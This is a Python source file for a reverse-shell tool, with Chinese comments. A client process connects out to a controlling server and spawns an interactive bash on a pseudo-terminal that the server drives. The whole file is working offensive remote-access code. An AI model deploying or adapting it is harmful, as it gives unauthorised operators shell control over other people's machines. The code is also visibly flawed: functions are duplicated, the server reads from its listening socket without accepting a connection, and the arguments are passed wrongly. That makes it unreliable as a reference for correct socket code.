#!/usr/bin/env python3
# coding=utf-8
# date 2022-01-12 15:44:57
# author calllivecn <c-all@qq.com>

"""
这里是使用反向shell连接到服务端的, Server是控制端，client是被控制端。
"""

import os
import sys
import pty
import tty
import fcntl
import socket
import struct
import signal
import termios
import argparse
import threading
import selectors
from subprocess import Popen
SHELL='bash -i'
STDIN = sys.stdin.fileno()
# STDIN = sys.stdin
STDOUT = sys.stdout.fileno()

def get_pty_size(fd):
    size = fcntl.ioctl(sys.stdin.fileno(), termios.TIOCGWINSZ, b"0000") # 占位符
    return struct.unpack("HH", size)

def set_pty_size(fd, columns, rows):
    size = struct.pack("HH", columns, rows)
    # 这个返回还知道是什么
    return fcntl.ioctl(sys.stdin.fileno(), termios.TIOCSWINSZ, size)


# 窗口大小调整
def signal_SIGWINCH_handle(sigNum, frame):
    size = get_pty_size(STDOUT)
    print(f"窗口大小改变: {size}")
    set_pty_size(STDOUT, *size)
    print("sigwinch 执行完成")



def socketshell(sock):
    try:
        env = os.environ.copy()
        pty_master, pty_slave = pty.openpty()

        ss = selectors.DefaultSelector()

        ss.register(pty_master, selectors.EVENT_READ)
        ss.register(sock, selectors.EVENT_READ)

        p = Popen(SHELL.split(), stdin=pty_slave, stdout=pty_slave, stderr=pty_slave, preexec_fn=os.setsid, universal_newlines=True)

        while p.poll() is None:

            for key, event in ss.select():
                fd = key.fileobj
                if fd == sock:
                    data = sock.recv(1024)
                    print("recv:", data)
                    
                    # 在peer挂掉的情况下会出现
                    if data == b"":
                        p.communicate()
                        break
                    os.write(pty_master, data)

                elif fd == pty_master:
                    data = os.read(pty_master, 1024)
                    if data:
                        sock.send(data)

            #print("新的一轮 select()")
    except Exception as e:
        # raise e
        print(f"捕获到异常退出: {e}")

    finally:
        sock.close()
        ss.close()
        print("sock exit")

STDIN = sys.stdin.fileno()
# STDIN = sys.stdin
STDOUT = sys.stdout.fileno()

def get_pty_size(fd):
    size = fcntl.ioctl(sys.stdin.fileno(), termios.TIOCGWINSZ, b"0000") # 占位符
    return struct.unpack("HH", size)

def set_pty_size(fd, columns, rows):
    size = struct.pack("HH", columns, rows)
    # 这个返回还知道是什么
    return fcntl.ioctl(sys.stdin.fileno(), termios.TIOCSWINSZ, size)


# 窗口大小调整
def signal_SIGWINCH_handle(sigNum, frame):
    size = get_pty_size(STDOUT)
    print(f"窗口大小改变: {size}")
    
    # termios.tcgetattr(sys.stdin)
    # termios.tcsetattr(sys.stdin, termios.TCSADRAIN, tty_bak)

    set_pty_size(STDOUT, *size)

    print("sigwinch 执行完成")


def server(addr, port):
    server_addr = (addr, port)
    print(sys.argv[0], "listen: ", server_addr)

    signal.signal(signal.SIGWINCH, signal_SIGWINCH_handle)
    sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    sock.bind(server_addr)
    sock.listen(5)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)

    # tty 
    tty_bak = termios.tcgetattr(sys.stdin)
    tty.setraw(STDIN)

    ss = selectors.DefaultSelector()
    ss.register(sock, selectors.EVENT_READ)
    ss.register(STDIN, selectors.EVENT_READ)

    exit_flag = True
    while exit_flag:
        for key, event in ss.select():
            fd = key.fileobj
            if fd == sock:
                data = sock.recv(1024)
                if not data:
                    exit_flag = False
                    break
                os.write(STDOUT, data)
            elif fd == STDIN:
                data = os.read(STDIN, 1024)
                sock.send(data)

    ss.close()

    termios.tcsetattr(sys.stdin, termios.TCSADRAIN, tty_bak)
    print("logout")


def client(addr, port=6789):
    server_addr = (addr, port)

    sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    sock.settimeout(10)

    while True:
        try:
            sock.connect(addr)
        except TimeoutError:
            print(f"连接超时。。。重新连接")
            continue

        print("client connect:", addr)
        th = threading.Thread(target=socketshell, args=(sock,), daemon=True)
        th.start()
        th.join()
        print(f"连接server: {server_addr}, 正常退出")


def main():
    parse = argparse.ArgumentParser(
        usage="%(prog)s <--server|--client>",
        description="反向shell连接",
        epilog="END",
    )

    parse.add_argument("--server", action="store_true", help="启动server端")
    parse.add_argument("--client", action="store_true", help="使用client端")
    parse.add_argument("--addr", help="需要连接的IP或域名")
    parse.add_argument("--port", help="端口")

    args = parse.parse_args()

    if args.server:
        server(args.server, args.port)
    
    elif args.client:
        client(args.server, args.port)
    else:
        parse.print_help()
        sys.exit(1)


if __name__ == "__main__":
    main()